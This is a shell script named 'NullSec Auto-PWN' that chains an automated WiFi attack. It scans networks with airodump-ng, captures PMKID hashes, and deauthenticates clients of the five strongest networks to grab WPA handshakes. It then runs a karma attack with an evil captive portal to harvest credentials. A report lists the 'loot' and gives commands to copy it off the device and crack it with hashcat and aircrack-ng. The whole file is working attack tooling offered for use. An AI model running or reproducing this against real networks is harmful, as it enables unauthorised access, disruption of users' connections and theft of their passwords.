#!/bin/sh
#===============================================================================
#  NULLSEC AUTO-PWN - Fully Automated WiFi Attack Chain
#===============================================================================

LOOT_DIR="/mmc/nullsec"
LOG_FILE="/root/nullsec/logs/autopwn_$(date +%Y%m%d_%H%M%S).log"
IFACE="${IFACE:-wlan1mon}"
PAYLOADS="/root/payloads/nullsec"

mkdir -p "$LOOT_DIR"/{handshakes,creds,probes,pmkid} "$(dirname $LOG_FILE)"

log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"; }
banner() {
    echo '
 ███╗   ██╗██╗   ██╗██╗     ██╗     ███████╗███████╗ ██████╗
 ████╗  ██║██║   ██║██║     ██║     ██╔════╝██╔════╝██╔════╝
 ██╔██╗ ██║██║   ██║██║     ██║     ███████╗█████╗  ██║     
 ██║╚██╗██║██║   ██║██║     ██║     ╚════██║██╔══╝  ██║     
 ██║ ╚████║╚██████╔╝███████╗███████╗███████║███████╗╚██████╗
 ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝ ╚═════╝
                    AUTO-PWN SEQUENCE
'
}

# Phase 1: Reconnaissance
phase_recon() {
    log "═══ PHASE 1: RECONNAISSANCE ═══"
    
    # Probe collection
    log "Collecting probe requests (30s)..."
    sh "$PAYLOADS/attacks/nullsec-probes.sh" capture 30
    
    # Build target list
    log "Scanning for networks..."
    timeout 30 airodump-ng "$IFACE" -w /tmp/autopwn_scan --output-format csv 2>/dev/null &
    sleep 30
    killall airodump-ng 2>/dev/null
    
    # Parse results
    cat /tmp/autopwn_scan-01.csv 2>/dev/null | grep -E "^[0-9A-F]" | head -20 > /tmp/targets.txt
    local target_count=$(wc -l < /tmp/targets.txt)
    log "Found $target_count networks"
}

# Phase 2: PMKID Collection
phase_pmkid() {
    log "═══ PHASE 2: PMKID COLLECTION ═══"
    
    log "Attempting PMKID capture (60s)..."
    sh "$PAYLOADS/attacks/nullsec-pmkid.sh" scan 60
    
    local pmkid_count=$(cat "$LOOT_DIR/pmkid"/*.22000 2>/dev/null | wc -l)
    log "Captured $pmkid_count PMKID hashes"
}

# Phase 3: Handshake Collection
phase_handshake() {
    log "═══ PHASE 3: HANDSHAKE COLLECTION ═══"
    
    # Get top 5 targets by signal strength
    cat /tmp/autopwn_scan-01.csv 2>/dev/null | grep -E "^[0-9A-F]" | \
    awk -F',' '{print $1","$4","$6","$14}' | sort -t',' -k3 -rn | head -5 | \
    while IFS=',' read bssid channel power essid; do
        bssid=$(echo "$bssid" | tr -d ' ')
        channel=$(echo "$channel" | tr -d ' ')
        essid=$(echo "$essid" | tr -d ' ')
        
        [[ -z "$bssid" || -z "$channel" ]] && continue
        
        log "Targeting $essid ($bssid) on channel $channel..."
        sh "$PAYLOADS/attacks/nullsec-deauth.sh" capture "$bssid" "$channel" &
        sleep 20
    done
    
    wait
    
    local hs_count=$(ls -1 "$LOOT_DIR/handshakes"/*.cap 2>/dev/null | wc -l)
    log "Captured $hs_count handshake files"
}

# Phase 4: Karma + Evil Portal
phase_karma() {
    log "═══ PHASE 4: KARMA ATTACK ═══"
    
    # Build SSID pool from probes
    sh "$PAYLOADS/attacks/nullsec-probes.sh" pool
    
    # Start karma with portal
    log "Starting karma attack with captive portal..."
    sh "$PAYLOADS/attacks/nullsec-karma.sh" start &
    local karma_pid=$!
    
    # Run for specified time
    log "Karma running for 120s..."
    sleep 120
    
    # Stop karma
    sh "$PAYLOADS/attacks/nullsec-karma.sh" stop
    kill $karma_pid 2>/dev/null
    
    local cred_count=$(wc -l < "$LOOT_DIR/creds/karma_creds.txt" 2>/dev/null || echo 0)
    log "Captured $cred_count credentials"
}

# Phase 5: Generate Report
phase_report() {
    log "═══ PHASE 5: GENERATING REPORT ═══"
    
    local report="$LOOT_DIR/autopwn_report_$(date +%Y%m%d_%H%M%S).txt"
    
    cat > "$report" << EOF
╔═══════════════════════════════════════════════════════════════════╗
║                    NULLSEC AUTO-PWN REPORT                        ║
║              Generated: $(date)                      ║
╚═══════════════════════════════════════════════════════════════════╝

=== MISSION SUMMARY ===
Start time: $(head -1 "$LOG_FILE" | cut -d']' -f1 | tr -d '[')
End time:   $(date '+%H:%M:%S')
Log file:   $LOG_FILE

=== LOOT COLLECTED ===

PMKID Hashes:
$(cat "$LOOT_DIR/pmkid"/*.22000 2>/dev/null | wc -l) total hashes
$(ls -la "$LOOT_DIR/pmkid"/*.22000 2>/dev/null)

Handshakes:
$(ls -la "$LOOT_DIR/handshakes"/*.cap 2>/dev/null | wc -l) capture files
$(ls -la "$LOOT_DIR/handshakes"/*.cap 2>/dev/null)

Credentials:
$(cat "$LOOT_DIR/creds"/*.txt 2>/dev/null)

Probe Intelligence:
$(cat "$LOOT_DIR/probes"/*.txt 2>/dev/null | wc -l) probe requests
$(cat "$LOOT_DIR/probes"/*.txt 2>/dev/null | awk -F'|' '{print $3}' | sort | uniq -c | sort -rn | head -10)

=== NETWORKS DISCOVERED ===
$(cat /tmp/autopwn_scan-01.csv 2>/dev/null | grep -E "^[0-9A-F]" | head -30)

=== NEXT STEPS ===
1. Transfer loot: scp -r root@pager:/mmc/nullsec/ ./loot/
2. Crack PMKID:   hashcat -m 22000 *.22000 wordlist.txt
3. Crack WPA:     aircrack-ng -w wordlist.txt *.cap

EOF

    log "Report saved: $report"
    cat "$report"
}

# Full auto-pwn sequence
run_autopwn() {
    banner
    log "Starting NullSec Auto-PWN sequence..."
    log "This will run: Recon → PMKID → Handshake → Karma → Report"
    echo ""
    
    phase_recon
    phase_pmkid
    phase_handshake
    phase_karma
    phase_report
    
    log "═══ AUTO-PWN COMPLETE ═══"
    echo ""
    echo "Loot directory: $LOOT_DIR"
    echo "Log file: $LOG_FILE"
}

# Quick mode (recon + pmkid only)
run_quick() {
    banner
    log "Starting quick mode (Recon + PMKID only)..."
    
    phase_recon
    phase_pmkid
    phase_report
    
    log "Quick mode complete!"
}

# Stealth mode (passive only)
run_stealth() {
    banner
    log "Starting stealth mode (passive collection only)..."
    
    log "═══ PASSIVE COLLECTION ═══"
    
    # Only probe collection, no active attacks
    log "Collecting probes passively (300s)..."
    sh "$PAYLOADS/attacks/nullsec-probes.sh" capture 300
    
    # Passive scan
    log "Passive network scan (120s)..."
    timeout 120 airodump-ng "$IFACE" -w "$LOOT_DIR/stealth_scan" --output-format csv 2>/dev/null
    
    phase_report
    log "Stealth mode complete!"
}

case "${1:-full}" in
    full) run_autopwn ;;
    quick) run_quick ;;
    stealth) run_stealth ;;
    recon) phase_recon ;;
    pmkid) phase_pmkid ;;
    handshake) phase_handshake ;;
    karma) phase_karma ;;
    report) phase_report ;;
    *)
        banner
        echo "NullSec Auto-PWN"
        echo "Usage: $0 <mode>"
        echo ""
        echo "Modes:"
        echo "  full      - Complete attack chain (default)"
        echo "  quick     - Recon + PMKID only"
        echo "  stealth   - Passive collection only"
        echo ""
        echo "Individual phases:"
        echo "  recon     - Network reconnaissance"
        echo "  pmkid     - PMKID collection"
        echo "  handshake - Handshake capture"
        echo "  karma     - Karma + portal attack"
        echo "  report    - Generate loot report"
        ;;
esac
